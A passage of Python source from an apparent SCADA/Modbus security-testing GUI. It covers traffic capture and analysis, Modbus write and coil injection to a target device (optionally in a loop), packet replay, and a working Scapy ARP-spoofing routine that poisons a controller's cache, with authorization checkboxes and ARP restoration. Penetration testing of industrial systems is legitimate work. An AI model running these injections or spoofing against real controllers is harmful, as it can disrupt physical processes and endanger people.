    def _run_live(self, iface: Optional[str], bpf_filter: str) -> None:
        try:
            batch_size = 200
            while self._live_running:
                for pkt, name, parsed in iter_live(
                    iface=iface, count=batch_size, bpf_filter=bpf_filter
                ):
                    if not self._live_running:
                        break
                    line = format_line(pkt, name, parsed)
                    self._analyze_records.append(parsed)
                    self._raw_packets.append(pkt)
                    self._msg_queue.put(("analyze_append", line))
                    self._msg_queue.put(("host_discovered", (pkt, parsed)))
                    try:
                        parsed["_src_ip"] = pkt["IP"].src if pkt.haslayer("IP") else ""
                        parsed["_dst_ip"] = pkt["IP"].dst if pkt.haslayer("IP") else ""
                    except Exception:
                        parsed["_src_ip"] = parsed["_dst_ip"] = ""
                    self._inference.feed(parsed)
        except Exception as e:
            self._msg_queue.put(("status", str(e)))
        self._msg_queue.put(("live_stopped", None))

    def _run_pcap(self) -> None:
        path = self.pcap_path.get().strip()
        if not path:
            self._log_status("Enter a PCAP path.")
            return
        if not Path(path).is_file():
            self._log_status(f"File not found: {path}")
            return
        self.analyze_text.delete("1.0", "end")
        self._analyze_records = []
        self._raw_packets = []
        self._log_status("Loading PCAP…")
        selected_ports = [(port, proto) for (_, port, proto), var in zip(SCADA_PORTS, self.port_vars) if var.get()]
        threading.Thread(target=self._run_pcap_thread, args=(path, selected_ports), daemon=True).start()
        # Drain queue soon so first load shows without waiting for the 200ms poll
        self.after(10, self._poll_queue)

    def _run_pcap_thread(self, path: str, selected_ports: Optional[List[tuple]] = None) -> None:
        try:
            self._controllers.clear()
            self._field_devices.clear()
            self._inference.reset()
            for pkt, name, parsed in iter_pcap(path, selected_ports=selected_ports or None):
                line = format_line(pkt, name, parsed)
                self._analyze_records.append(parsed)
                self._raw_packets.append(pkt)
                self._msg_queue.put(("analyze_append", line))
                self._msg_queue.put(("host_discovered", (pkt, parsed)))
                try:
                    parsed["_src_ip"] = pkt["IP"].src if pkt.haslayer("IP") else ""
                    parsed["_dst_ip"] = pkt["IP"].dst if pkt.haslayer("IP") else ""
                except Exception:
                    parsed["_src_ip"] = parsed["_dst_ip"] = ""
                self._inference.feed(parsed)
            self._msg_queue.put(("status", f"Loaded {len(self._analyze_records)} messages."))
        except Exception as e:
            self._msg_queue.put(("status", f"Error: {e}"))

    def _clear_traffic(self) -> None:
        self.analyze_text.delete("1.0", "end")
        self._analyze_records.clear()
        self._raw_packets.clear()
        self._controllers.clear()
        self._field_devices.clear()
        self._inference.reset()
        self._refresh_host_map()
        self._refresh_auto_analysis()
        self._log_status("Traffic log cleared.")

    def _export_analyze(self) -> None:
        if not self._analyze_records:
            self._log_status("No data to export. Load a PCAP or run live capture first.")
            return
        path = tkinter.filedialog.asksaveasfilename(
            title="Export",
            defaultextension=".json",
            filetypes=[
                ("PCAP", "*.pcap"),
                ("JSON", "*.json"),
                ("CSV", "*.csv"),
                ("All files", "*.*"),
            ],
        )
        if not path:
            return
        try:
            if path.lower().endswith(".pcap"):
                if not self._raw_packets:
                    self._log_status("No raw packets to export.")
                    return
                from scapy.utils import wrpcap
                wrpcap(path, self._raw_packets)
            elif path.lower().endswith(".csv"):
                export_csv(self._analyze_records, path)
            else:
                export_json(self._analyze_records, path)
            self._log_status(f"Exported {len(self._raw_packets) if path.lower().endswith('.pcap') else len(self._analyze_records)} records to {path}")
        except Exception as e:
            self._log_status(f"Export failed: {e}")

    def _build_inject_tab(self) -> None:
        top = self.tabs.tab("Inject")
        f = ctk.CTkFrame(top, fg_color="transparent")
        f.pack(fill="x", pady=4)
        ctk.CTkLabel(f, text="Target:").pack(side="left", padx=(0, 6))
        self.inject_target = ctk.CTkEntry(f, width=140, placeholder_text="192.168.1.10")
        self.inject_target.pack(side="left", padx=4)
        ctk.CTkLabel(f, text="Port:").pack(side="left", padx=(12, 4))
        self.inject_port = ctk.CTkEntry(f, width=60)
        self.inject_port.insert(0, "502")
        self.inject_port.pack(side="left", padx=4)
        ctk.CTkButton(f, text="? Function Codes", width=120, height=22,
                      font=("", 11), fg_color="transparent", hover_color=_NEUTRAL_HOV,
                      text_color=_MUTED, border_width=1, border_color=_NEUTRAL_BTN,
                      command=self._show_fc_help).pack(side="left", padx=(16, 0))

        self.inject_cmd = ctk.StringVar(value="write_register")
        rb_row = ctk.CTkFrame(top, fg_color="transparent")
        rb_row.pack(fill="x", pady=(4, 0))
        ctk.CTkRadioButton(rb_row, text="Write single register (FC6)", variable=self.inject_cmd, value="write_register").pack(side="left", padx=(0, 16))
        ctk.CTkRadioButton(rb_row, text="Write multiple registers (FC16)", variable=self.inject_cmd, value="write_registers").pack(side="left", padx=(0, 16))
        rb_row2 = ctk.CTkFrame(top, fg_color="transparent")
        rb_row2.pack(fill="x", pady=(2, 0))
        ctk.CTkRadioButton(rb_row2, text="Write single coil (FC5)", variable=self.inject_cmd, value="write_coil").pack(side="left", padx=(0, 16))
        ctk.CTkRadioButton(rb_row2, text="Read coils (FC1)", variable=self.inject_cmd, value="read_coils").pack(side="left", padx=(0, 16))

        row2 = ctk.CTkFrame(top, fg_color="transparent")
        row2.pack(fill="x", pady=8)
        ctk.CTkLabel(row2, text="Unit ID:").pack(side="left", padx=(0, 4))
        self.inject_unit = ctk.CTkEntry(row2, width=50)
        self.inject_unit.insert(0, "1")
        self.inject_unit.pack(side="left", padx=4)
        ctk.CTkLabel(row2, text="Addr:").pack(side="left", padx=(12, 4))
        self.inject_addr = ctk.CTkEntry(row2, width=80)
        self.inject_addr.insert(0, "0")
        self.inject_addr.pack(side="left", padx=4)

        self._inject_value_frame = ctk.CTkFrame(row2, fg_color="transparent")
        ctk.CTkLabel(self._inject_value_frame, text="Value:").pack(side="left", padx=(0, 4))
        self.inject_value = ctk.CTkEntry(self._inject_value_frame, width=80)
        self.inject_value.pack(side="left")
        self._inject_value_frame.pack(side="left", padx=(12, 0))

        self._inject_values_frame = ctk.CTkFrame(row2, fg_color="transparent")
        ctk.CTkLabel(self._inject_values_frame, text="Values (comma):").pack(side="left", padx=(0, 4))
        self.inject_values = ctk.CTkEntry(self._inject_values_frame, width=120, placeholder_text="1,2,3")
        self.inject_values.pack(side="left")

        self._inject_coil_frame = ctk.CTkFrame(row2, fg_color="transparent")
        ctk.CTkLabel(self._inject_coil_frame, text="State:").pack(side="left", padx=(0, 4))
        self.inject_coil_state = ctk.CTkSegmentedButton(self._inject_coil_frame, values=["ON", "OFF"], width=100)
        self.inject_coil_state.set("ON")
        self.inject_coil_state.pack(side="left")

        self._inject_count_frame = ctk.CTkFrame(row2, fg_color="transparent")
        ctk.CTkLabel(self._inject_count_frame, text="Count:").pack(side="left", padx=(0, 4))
        self.inject_count = ctk.CTkEntry(self._inject_count_frame, width=60)
        self.inject_count.insert(0, "8")
        self.inject_count.pack(side="left")

        self.inject_cmd.trace_add("write", lambda *_: self._update_inject_fields())
        self._update_inject_fields()

        row3 = ctk.CTkFrame(top, fg_color="transparent")
        row3.pack(fill="x", pady=4)
        self.inject_allow_write = ctk.CTkCheckBox(row3, text="Allow write (by default turned off for safety)")
        self.inject_allow_write.pack(side="left", padx=0)
        ctk.CTkButton(row3, text="Execute Once", width=110, command=self._do_inject).pack(side="left", padx=(20, 4))
        self._inject_loop_btn = ctk.CTkButton(row3, text="Toggle Inject", width=120,
                                              fg_color=_ORANGE, hover_color=_ORANGE_HOVER,
                                              command=self._toggle_inject_loop)
        self._inject_loop_btn.pack(side="left", padx=4)
        self._inject_loop_interval = ctk.CTkEntry(row3, width=55, placeholder_text="ms")
        self._inject_loop_interval.insert(0, "500")
        self._inject_loop_interval.pack(side="left", padx=(4, 2))
        ctk.CTkLabel(row3, text="ms", font=("", 11)).pack(side="left")

        self._inject_looping = False
        self.inject_log = ctk.CTkTextbox(top, height=120, font=("Consolas", 10), wrap="none", activate_scrollbars=True)
        self.inject_log._textbox.configure(wrap="none")
        self.inject_log.pack(fill="both", expand=True, pady=(12, 0))
        ctk.CTkButton(top, text="Clear Log", width=90, height=24,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=lambda: self.inject_log.delete("1.0", "end")).pack(anchor="e", pady=(4, 0))

    def _toggle_inject_loop(self) -> None:
        self._inject_looping = not self._inject_looping
        if self._inject_looping:
            self._inject_loop_btn.configure(fg_color=_RED_FG, hover_color=_RED_HOVER)
            self._run_inject_loop()
        else:
            self._inject_loop_btn.configure(fg_color=_ORANGE, hover_color=_ORANGE_HOVER)

    def _run_inject_loop(self) -> None:
        if not self._inject_looping:
            return
        self._do_inject()
        try:
            interval = max(100, int(self._inject_loop_interval.get().strip() or "500"))
        except ValueError:
            interval = 500
        self.after(interval, self._run_inject_loop)

    def _update_inject_fields(self) -> None:
        cmd = self.inject_cmd.get()
        self._inject_value_frame.pack_forget()
        self._inject_values_frame.pack_forget()
        self._inject_coil_frame.pack_forget()
        self._inject_count_frame.pack_forget()
        if cmd == "write_register":
            self._inject_value_frame.pack(side="left", padx=(12, 0))
        elif cmd == "write_registers":
            self._inject_values_frame.pack(side="left", padx=(12, 0))
        elif cmd == "write_coil":
            self._inject_coil_frame.pack(side="left", padx=(12, 0))
        elif cmd == "read_coils":
            self._inject_count_frame.pack(side="left", padx=(12, 0))

    def _do_inject(self) -> None:
        import datetime
        def _log(msg: str, stamp: bool = False) -> None:
            prefix = datetime.datetime.now().strftime("[%H:%M:%S] ") if stamp else ""
            self._msg_queue.put(("inject_log", prefix + msg))

        def _fail(msg: str) -> None:
            """Log an error and stop the inject loop if it's running."""
            _log(f"⚠ {msg} — loop stopped." if self._inject_looping else f"⚠ {msg}")
            if self._inject_looping:
                self._inject_looping = False
                self.after(0, lambda: self._inject_loop_btn.configure(
                    fg_color=_ORANGE, hover_color=_ORANGE_HOVER))

        target = self.inject_target.get().strip()
        if not target:
            _fail("Enter a target IP")
            return
        try:
            port = int(self.inject_port.get().strip() or "502")
        except ValueError:
            _fail("Invalid port")
            return
        try:
            unit = int(self.inject_unit.get().strip() or "1")
        except ValueError:
            _fail("Invalid unit ID")
            return

        cmd = self.inject_cmd.get()
        allow_write = self.inject_allow_write.get()

        def run() -> None:
            try:
                if cmd == "write_register":
                    if not allow_write:
                        _fail("Enable 'Allow write' before sending write commands")
                        return
                    addr = int(self.inject_addr.get().strip() or "0")
                    value = int(self.inject_value.get().strip() or "0")
                    prefix = f"WRITE  {target}:{port}  unit={unit}  addr={addr}  value={value}"
                    resp = inject_modbus_write_register(target, port, unit, addr, value, write_flag=True)
                    result = f"→ OK ({len(resp)} bytes)" if resp else "→ No response or error."
                    _log(f"{prefix}  {result}", stamp=True)
                    if resp:
                        self._inject_written.add((target, unit, addr))
                        self.after(0, self._refresh_vuln_findings)
                elif cmd == "write_registers":
                    if not allow_write:
                        _fail("Enable 'Allow write' before sending write commands")
                        return
                    addr = int(self.inject_addr.get().strip() or "0")
                    raw = self.inject_values.get().strip()
                    values = [int(x.strip()) for x in raw.split(",") if x.strip()]
                    if not values:
                        _fail("Enter comma-separated values")
                        return
                    prefix = f"WRITE  {target}:{port}  unit={unit}  addr={addr}  values={values}"
                    resp = inject_modbus_write_multiple_registers(target, port, unit, addr, values, write_flag=True)
                    result = f"→ OK ({len(resp)} bytes)" if resp else "→ No response or error."
                    _log(f"{prefix}  {result}", stamp=True)
                    if resp:
                        self._inject_written.add((target, unit, addr))
                        self.after(0, self._refresh_vuln_findings)
                elif cmd == "write_coil":
                    if not allow_write:
                        _fail("Enable 'Allow write' before sending write commands")
                        return
                    addr = int(self.inject_addr.get().strip() or "0")
                    on = self.inject_coil_state.get() == "ON"
                    state_str = "ON" if on else "OFF"
                    prefix = f"COIL   {target}:{port}  unit={unit}  addr={addr}  {state_str}"
                    resp = inject_modbus_write_single_coil(target, port, unit, addr, on, write_flag=True)
                    result = f"→ OK ({len(resp)} bytes)" if resp else "→ No response or error."
                    _log(f"{prefix}  {result}", stamp=True)
                    if resp:
                        self._inject_written.add((target, unit, addr))
                        self.after(0, self._refresh_vuln_findings)
                elif cmd == "read_coils":
                    addr = int(self.inject_addr.get().strip() or "0")
                    count = int(self.inject_count.get().strip() or "8")
                    prefix = f"READ COILS  {target}:{port}  unit={unit}  addr={addr}  count={count}"
                    resp = inject_modbus_read_coils(target, port, unit, addr, count)
                    if resp and len(resp) > 9:
                        # Parse coil bits from response: byte_count at offset 8, then data bytes
                        byte_count = resp[8]
                        coil_bytes = resp[9:9 + byte_count]
                        bits = []
                        for b in coil_bytes:
                            for bit in range(8):
                                bits.append((b >> bit) & 1)
                        coil_str = "  ".join(f"{addr+i}={'ON' if bits[i] else 'OFF'}" for i in range(min(count, len(bits))))
                        _log(f"{prefix}  → {coil_str}", stamp=True)
                    else:
                        _log(f"{prefix}  → No response or error.", stamp=True)
            except ValueError as e:
                _fail(f"Invalid input: {e}")
            except Exception as e:
                _log(f"Error: {e}")

        threading.Thread(target=run, daemon=True).start()

    def _build_attack_tab(self) -> None:
        top = self.tabs.tab("Attacks")

        # ── Safety checkbox ───────────────────────────────────────────────────
        self._attack_allow = ctk.CTkCheckBox(
            top,
            text="I confirm this is an authorized test system — allow attack operations",
        )
        self._attack_allow.pack(anchor="w", pady=(0, 8))

        # ── ARP SPOOF section ─────────────────────────────────────────────────
        ctk.CTkLabel(top, text="ARP SPOOF", font=("", 11, "bold"),
                     text_color=_ORANGE, anchor="w").pack(fill="x", pady=(0, 4))

        cfg = ctk.CTkFrame(top, fg_color=_PANEL_BG, corner_radius=6)
        cfg.pack(fill="x", pady=(0, 4))

        row1 = ctk.CTkFrame(cfg, fg_color="transparent")
        row1.pack(fill="x", padx=12, pady=(10, 4))
        ctk.CTkLabel(row1, text="Controller IP:", width=110, anchor="e").pack(side="left", padx=(0, 6))
        self._arp_controller = ctk.CTkEntry(row1, width=160, placeholder_text="172.20.0.10")
        self._arp_controller.pack(side="left", padx=4)
        ctk.CTkButton(row1, text="↑ from Recon", width=110, height=26,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=self._arp_autofill).pack(side="left", padx=(12, 0))

        row2 = ctk.CTkFrame(cfg, fg_color="transparent")
        row2.pack(fill="x", padx=12, pady=4)
        ctk.CTkLabel(row2, text="Interface:", width=110, anchor="e").pack(side="left", padx=(0, 6))
        self._arp_iface_var = ctk.StringVar(value="eth0")
        self._arp_iface_entry = ctk.CTkEntry(row2, width=120, textvariable=self._arp_iface_var)
        self._arp_iface_entry.pack(side="left", padx=4)
        ctk.CTkLabel(row2, text="  Interval:", anchor="e").pack(side="left", padx=(16, 6))
        self._arp_interval = ctk.CTkEntry(row2, width=50)
        self._arp_interval.insert(0, "0.5")
        self._arp_interval.pack(side="left")
        ctk.CTkLabel(row2, text="sec", font=("", 11), text_color=_MUTED).pack(side="left", padx=(4, 0))

        fd_row = ctk.CTkFrame(cfg, fg_color="transparent")
        fd_row.pack(fill="x", padx=12, pady=(4, 10))
        ctk.CTkLabel(fd_row, text="Spoof as\n(field devices):", width=110, anchor="ne",
                     justify="right").pack(side="left", padx=(0, 6), anchor="n", pady=2)
        self._arp_fd_box = ctk.CTkTextbox(fd_row, height=72, width=160,
                                          font=("Consolas", 11),
                                          fg_color=("#F9F9FA", "#343638"),
                                          border_color=("#979DA2", "#565B5E"),
                                          border_width=2)
        self._arp_fd_box.pack(side="left")

        arp_btn_row = ctk.CTkFrame(top, fg_color="transparent")
        arp_btn_row.pack(fill="x", pady=(0, 6))
        self._arp_toggle_btn = ctk.CTkButton(arp_btn_row, text="▶  Start ARP Spoof",
                                             fg_color=_ORANGE, hover_color=_ORANGE_HOVER,
                                             width=170, command=self._toggle_arp_spoof)
        self._arp_toggle_btn.pack(side="left", padx=(0, 8))
        self._arp_status_lbl = ctk.CTkLabel(arp_btn_row, text="", font=("", 11),
                                             text_color=_MUTED, anchor="w")
        self._arp_status_lbl.pack(side="left", padx=12)

        # ── REPLAY section ────────────────────────────────────────────────────
        ctk.CTkFrame(top, fg_color=_MUTED, height=1).pack(fill="x", pady=(4, 8))
        ctk.CTkLabel(top, text="REPLAY", font=("", 11, "bold"),
                     text_color=_ORANGE, anchor="w").pack(fill="x", pady=(0, 4))

        rrow1 = ctk.CTkFrame(top, fg_color="transparent")
        rrow1.pack(fill="x", pady=(0, 4))
        ctk.CTkLabel(rrow1, text="PCAP:").pack(side="left", padx=(0, 6))
        self.replay_pcap = ctk.CTkEntry(rrow1, width=350, placeholder_text="Path to PCAP")
        self.replay_pcap.pack(side="left", padx=4, fill="x", expand=True)
        ctk.CTkButton(rrow1, text="Browse", width=80,
                      command=self._browse_replay_pcap).pack(side="left", padx=8)

        rrow2 = ctk.CTkFrame(top, fg_color="transparent")
        rrow2.pack(fill="x", pady=(0, 6))
        ctk.CTkLabel(rrow2, text="Target:").pack(side="left", padx=(0, 6))
        self.replay_target = ctk.CTkEntry(rrow2, width=140, placeholder_text="192.168.1.10")
        self.replay_target.pack(side="left", padx=4)
        ctk.CTkLabel(rrow2, text="Port:").pack(side="left", padx=(12, 4))
        self.replay_port = ctk.CTkEntry(rrow2, width=60)
        self.replay_port.insert(0, "502")
        self.replay_port.pack(side="left", padx=4)
        ctk.CTkLabel(rrow2, text="Index (0-based):").pack(side="left", padx=(12, 4))
        self.replay_index = ctk.CTkEntry(rrow2, width=60, placeholder_text="first")
        self.replay_index.pack(side="left", padx=4)
        ctk.CTkButton(rrow2, text="Replay", width=90,
                      command=self._do_replay).pack(side="left", padx=16)

        # ── Shared log ────────────────────────────────────────────────────────
        ctk.CTkFrame(top, fg_color=_MUTED, height=1).pack(fill="x", pady=(0, 6))
        self._attack_log = ctk.CTkTextbox(top, font=("Consolas", 10), fg_color=_PANEL_BG)
        self._attack_log.pack(fill="both", expand=True)
        self._attack_log.configure(state="disabled")
        # alias so _poll_queue's "replay_log" handler keeps working
        self.replay_log = self._attack_log

    def _arp_autofill(self) -> None:
        """Populate controller and field device fields from discovered hosts."""
        if self._controllers:
            self._arp_controller.delete(0, "end")
            self._arp_controller.insert(0, sorted(self._controllers)[0])
        if self._field_devices:
            self._arp_fd_box.delete("1.0", "end")
            self._arp_fd_box.insert("1.0", "\n".join(sorted(self._field_devices)))

    def _arp_log_msg(self, msg: str) -> None:
        import datetime
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self._attack_log.configure(state="normal")
        self._attack_log.insert("end", f"[{ts}] {msg}\n")
        self._attack_log.see("end")
        self._attack_log.configure(state="disabled")

    def _toggle_arp_spoof(self) -> None:
        if self._arp_running:
            self._arp_stop_event.set()
            self._arp_status_lbl.configure(text="Stopping…", text_color=_MUTED)
            return

        if not self._attack_allow.get():
            self._arp_status_lbl.configure(
                text="Check the authorization box first.", text_color=_RED_FG)
            return
        controller_ip = self._arp_controller.get().strip()
        fd_text = self._arp_fd_box.get("1.0", "end").strip()
        field_ips = [l.strip() for l in fd_text.splitlines() if l.strip()]
        iface = self._arp_iface_var.get().strip() or "eth0"
        try:
            interval = float(self._arp_interval.get().strip())
        except ValueError:
            interval = 0.5

        if not controller_ip:
            self._arp_status_lbl.configure(text="Controller IP required.", text_color=_RED_FG)
            return
        if not field_ips:
            self._arp_status_lbl.configure(text="At least one field device IP required.", text_color=_RED_FG)
            return

        self._arp_stop_event.clear()
        self._arp_running = True
        self._arp_toggle_btn.configure(text="■  Stop ARP Spoof",
                                       fg_color=_RED_FG, hover_color=_RED_HOVER)
        self._arp_status_lbl.configure(text="Running…", text_color=_ORANGE)
        self._attack_log.configure(state="normal")
        self._attack_log.delete("1.0", "end")
        self._attack_log.configure(state="disabled")

        threading.Thread(
            target=self._arp_spoof_loop,
            args=(controller_ip, field_ips, iface, interval),
            daemon=True,
        ).start()

    def _arp_spoof_loop(self, controller_ip: str, field_ips: List[str],
                        iface: str, interval: float) -> None:
        try:
            from scapy.layers.l2 import ARP, Ether
            from scapy.sendrecv import sendp, srp
        except ImportError:
            self.after(0, lambda: self._arp_log_msg("ERROR: Scapy not available."))
            self.after(0, self._arp_reset_buttons)
            return

        def resolve_mac(ip: str) -> Optional[str]:
            """Send ARP request, return MAC or None."""
            try:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                             iface=iface, timeout=2, verbose=False)
                if ans:
                    return ans[0][1].hwsrc
            except Exception:
                pass
            return None

        def get_own_mac() -> str:
            try:
                from scapy.arch import get_if_hwaddr
                return get_if_hwaddr(iface)
            except Exception:
                return "00:00:00:00:00:00"

        self.after(0, lambda: self._arp_log_msg(f"Resolving MACs on interface {iface}…"))

        controller_mac = resolve_mac(controller_ip)
        if not controller_mac:
            self.after(0, lambda: self._arp_log_msg(
                f"ERROR: Could not resolve MAC for controller {controller_ip}. "
                "Check interface and IP."))
            self.after(0, self._arp_reset_buttons)
            return
        self.after(0, lambda m=controller_mac: self._arp_log_msg(
            f"Controller {controller_ip} → {m}"))

        # Resolve real MACs of field devices (needed for restoration)
        real_fd_macs: dict = {}
        for fd_ip in field_ips:
            mac = resolve_mac(fd_ip)
            if mac:
                real_fd_macs[fd_ip] = mac
                self.after(0, lambda i=fd_ip, m=mac: self._arp_log_msg(
                    f"Field device {i} → {m}"))
            else:
                self.after(0, lambda i=fd_ip: self._arp_log_msg(
                    f"WARNING: Could not resolve MAC for {i} — will still poison but cannot restore."))

        own_mac = get_own_mac()
        self.after(0, lambda: self._arp_log_msg(
            f"Attack box MAC: {own_mac}"))
        self.after(0, lambda: self._arp_log_msg(
            f"Poisoning controller ARP cache — spoofing {len(field_ips)} field device(s). "
            f"Interval: {interval}s"))

        cycle = 0
        while not self._arp_stop_event.is_set():
            cycle += 1
            sent = 0
            for fd_ip in field_ips:
                try:
                    # Tell controller: "I am <fd_ip>, my MAC is <own_mac>"
                    pkt = (Ether(dst=controller_mac) /
                           ARP(op=2,
                               pdst=controller_ip, hwdst=controller_mac,
                               psrc=fd_ip,         hwsrc=own_mac))
                    sendp(pkt, iface=iface, verbose=False)
                    sent += 1
                except Exception as e:
                    self.after(0, lambda err=str(e): self._arp_log_msg(f"Send error: {err}"))
            self.after(0, lambda c=cycle, s=sent: self._arp_log_msg(
                    f"Cycle {c}: sent {s} poison packet(s)."))
            self._arp_stop_event.wait(interval)

        # ── Restore ARP tables ────────────────────────────────────────────────
        self.after(0, lambda: self._arp_log_msg("Stopping — sending ARP restoration packets…"))
        for fd_ip, fd_mac in real_fd_macs.items():
            try:
                restore = (Ether(dst=controller_mac) /
                           ARP(op=2,
                               pdst=controller_ip, hwdst=controller_mac,
                               psrc=fd_ip,         hwsrc=fd_mac))
                sendp(restore, iface=iface, count=3, inter=0.1, verbose=False)
                self.after(0, lambda i=fd_ip, m=fd_mac: self._arp_log_msg(
                    f"Restored: {i} → {m}"))
            except Exception as e:
                self.after(0, lambda err=str(e): self._arp_log_msg(f"Restore error: {err}"))

        self.after(0, lambda: self._arp_log_msg("ARP tables restored. Attack stopped."))
        self.after(0, self._arp_reset_buttons)

    def _arp_reset_buttons(self) -> None:
        self._arp_running = False
        self._arp_toggle_btn.configure(text="▶  Start ARP Spoof",
                                       fg_color=_ORANGE, hover_color=_ORANGE_HOVER)
        self._arp_status_lbl.configure(text="Stopped.", text_color=_MUTED)

    def _browse_replay_pcap(self) -> None:
        path = tkinter.filedialog.askopenfilename(
            title="Select PCAP",
            filetypes=[("PCAP files", "*.pcap *.pcapng"), ("All files", "*.*")],
        )
        if path:
            self.replay_pcap.delete(0, "end")
            self.replay_pcap.insert(0, path)

    def _do_replay(self) -> None:
        if not self._attack_allow.get():
            self._msg_queue.put(("replay_log", "Check the authorization box first."))
            return
        pcap_path = self.replay_pcap.get().strip()
        target = self.replay_target.get().strip()
        if not pcap_path or not target:
            self._msg_queue.put(("replay_log", "Set PCAP path and target."))
            return
        try:
            port = int(self.replay_port.get().strip() or "502")
        except ValueError:
            self._msg_queue.put(("replay_log", "Invalid port."))
            return
        idx_str = self.replay_index.get().strip()
        index = int(idx_str) if idx_str else None

        write_authorized = self._attack_allow.get()

        def run() -> None:
            try:
                msgs = get_messages_from_pcap(pcap_path, protocol_filter=["modbus"], index=index)
                if not msgs:
                    self._msg_queue.put(("replay_log", "No messages found."))
                    return
                pkt, name, parsed = msgs[0]
                fc = parsed.get("func_code")
                resp = replay_one(pkt, name, target, port, write_flag=write_authorized)
                if resp is not None:
                    fc_note = f" (FC{fc})" if fc else ""
                    self._msg_queue.put(("replay_log", f"Replayed 1 message{fc_note}, response {len(resp)} bytes."))
                else:
                    self._msg_queue.put(("replay_log", "Replay failed or no response."))
            except Exception as e:
                self._msg_queue.put(("replay_log", f"Error: {e}"))

        threading.Thread(target=run, daemon=True).start()

    # ── Infer tab ─────────────────────────────────────────────────────────────

    def _build_infer_tab(self) -> None:
        top = self.tabs.tab("Infer")

        # Toolbar
        bar = ctk.CTkFrame(top, fg_color="transparent")
        bar.pack(fill="x", pady=(0, 6))
        ctk.CTkLabel(bar, text="Auto-classifies register purpose from observed traffic patterns.",
                     font=("", 11), text_color=_MUTED).pack(side="left")
        ctk.CTkButton(bar, text="Clear", width=70,
                      command=self._clear_infer).pack(side="right", padx=4)
        ctk.CTkButton(bar, text="Export CSV", width=90,
                      command=self._export_infer).pack(side="right", padx=4)
        ctk.CTkButton(bar, text="Load Infer", width=90,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=self._load_infer_session).pack(side="right", padx=4)
        ctk.CTkButton(bar, text="Save Infer", width=90,
                      command=self._save_infer_session).pack(side="right", padx=4)
        ctk.CTkButton(bar, text="?", width=30, height=28,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=self._show_inference_legend).pack(side="left", padx=(12, 4))

        # Filter row
        frow = ctk.CTkFrame(top, fg_color="transparent")
        frow.pack(fill="x", pady=(0, 4))
        ctk.CTkLabel(frow, text="Min confidence:").pack(side="left", padx=(0, 6))
        self._infer_conf_var = ctk.StringVar(value="All")
        ctk.CTkOptionMenu(frow, values=["All", "HIGH", "MED"], variable=self._infer_conf_var,
                          width=100, command=lambda _: self._refresh_infer()).pack(side="left")
        ctk.CTkLabel(frow, text="  Unit ID filter:").pack(side="left", padx=(12, 6))
        self._infer_unit_var = ctk.StringVar(value="All")
        self._infer_unit_menu = ctk.CTkOptionMenu(
            frow, values=["All"], variable=self._infer_unit_var,
            width=80, command=lambda _: self._refresh_infer())
        self._infer_unit_menu.pack(side="left")
        self._infer_count_label = ctk.CTkLabel(frow, text="0 registers", font=("", 11),
                                               text_color=_MUTED)
        self._infer_count_label.pack(side="right", padx=8)

        # Flicker-free textbox — header baked in as first line
        self._infer_textbox = ctk.CTkTextbox(
            top, font=("Consolas", 10), wrap="none",
            fg_color=_PANEL_BG, text_color=_CODE_FG,
            activate_scrollbars=True,
        )
        self._infer_textbox.pack(fill="both", expand=True, pady=(2, 0))
        self._infer_textbox._textbox.bind("<ButtonRelease-1>", self._on_infer_click)
        self._infer_textbox.configure(state="disabled")

        # Status bar
        self._infer_status = ctk.CTkLabel(top, text="Start live capture or load a PCAP to populate.",
                                          font=("", 10), text_color=_MUTED, anchor="w")
        self._infer_status.pack(fill="x", pady=(2, 0))

        # ── Vulnerability Findings collapsible strip ──────────────────────────
        self._vf_visible = True

        vf_toggle_row = ctk.CTkFrame(top, fg_color="transparent")
        vf_toggle_row.pack(fill="x", pady=(6, 0))
        self._vf_toggle_btn = ctk.CTkButton(
            vf_toggle_row, text="▼  VULNERABILITY FINDINGS", width=210, height=22,
            font=("", 11, "bold"), fg_color="transparent", hover_color=_NEUTRAL_HOV,
            text_color=_RED_FG, anchor="w",
            command=self._toggle_vuln_findings,
        )
        self._vf_toggle_btn.pack(side="left")
        self._vf_count_lbl = ctk.CTkLabel(
            vf_toggle_row, text="", font=("", 10), text_color=_MUTED, anchor="w",
        )
        self._vf_count_lbl.pack(side="left", padx=6)

        self._vf_panel = ctk.CTkFrame(top, fg_color=_PANEL_BG, corner_radius=6, height=130)
        self._vf_panel.pack(fill="x", pady=(2, 0))

        self._vf_textbox = ctk.CTkTextbox(
            self._vf_panel, font=("Consolas", 10), wrap="none",
            fg_color=_PANEL_BG, text_color=_CODE_FG,
            height=120, activate_scrollbars=True,
        )
        self._vf_textbox.pack(fill="both", expand=True, padx=2, pady=(0, 2))
        self._vf_textbox.configure(state="disabled")
        self._vf_row_index: list[tuple[str, int, int]] = []  # [(ip, uid, addr), ...] per data row

        # Colour tags for severity badges
        tb = self._vf_textbox._textbox
        tb.tag_configure("CRITICAL", foreground="#ff5555", font=("Consolas", 10, "bold"))
        tb.tag_configure("HIGH",     foreground="#ff9933", font=("Consolas", 10, "bold"))
        tb.tag_configure("MEDIUM",   foreground="#ddcc22", font=("Consolas", 10, "bold"))
        tb.tag_configure("LOW",      foreground="#55aa55", font=("Consolas", 10, "bold"))
        tb.tag_configure("written",  foreground="#ff6900")
        tb.bind("<ButtonRelease-1>", self._on_vf_click)

    def _refresh_infer(self) -> None:
        """Update the infer results table in-place (no widget destruction = no flicker)."""
        import datetime
        results = self._inference.classify_all()

        conf_filter = self._infer_conf_var.get()
        unit_filter = self._infer_unit_var.get()

        # Update unit dropdown without triggering a refresh loop
        units = sorted({str(r["unit_id"]) for r in results})
        self._infer_unit_menu.configure(values=["All"] + units)

        # Apply filters
        CONF_RANK = {HIGH: 2, MEDIUM: 1, "LOW": 0}
        min_rank = CONF_RANK.get(conf_filter, -1) if conf_filter != "All" else -1
        if conf_filter != "All":
            results = [r for r in results if CONF_RANK.get(r["confidence"], 0) >= min_rank]
        if unit_filter != "All":
            results = [r for r in results if str(r["unit_id"]) == unit_filter]

        # Build plain-text table (monospace columns)
        HDR = f"{'IP':<15}  {'U':>2} {'A':>3}  {'Last Val':>8}  {'Range':<11}  {'Conf':<4}  {'Type':<16}  Hint"
        SEP = "─" * 104
        lines = [HDR, SEP]
